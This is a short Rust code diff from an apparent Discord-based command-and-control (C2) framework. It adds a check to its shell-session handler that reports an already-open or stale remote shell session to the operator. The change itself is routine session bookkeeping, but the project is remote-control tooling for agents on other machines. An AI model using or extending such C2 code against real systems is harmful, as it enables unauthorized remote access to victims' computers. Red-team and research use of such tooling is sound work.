@@ -2,7 +2,7 @@ use crate::{
     commands::shell::{exit, download},
     errors::DiscordC2Error,
     os::process_handler::{ProcessHandler, ShellType},
-    utils::agent::get_or_create_agent,
+    utils::agent::{get_or_create_agent},
     discord_utils::channels::create_text_channel,
     discord_utils::bot_functions::{send_code_message, send_ephemeral_response, send_channel_message}
 };
@@ -180,6 +180,21 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
 /// agent has been initialized. It also assumes that the `session::run` function returns a message string
 /// followed by an optional `ShellType` object.
 pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
+    let shell_type = SHELL_TYPE.lock().await;
+
+    if shell_type.is_some() {
+         match ProcessHandler::is_instantiated().await {
+            true => {
+                let agent = get_or_create_agent(ctx).await;
+                send_ephemeral_response(ctx, command, format!("A shell session already exists at the channel <#{}>", agent.get_session_channel().unwrap())).await?;
+            },
+            false => {
+                send_ephemeral_response(ctx, command, "Likely a stale or expired session...").await?;
+                return Err(DiscordC2Error::InvalidShellType)
+            }
+        };
+    }
+
     let (content, shell) = run(ctx, &command.data.options).await?;
     send_ephemeral_response(ctx, command, &content).await?;
 
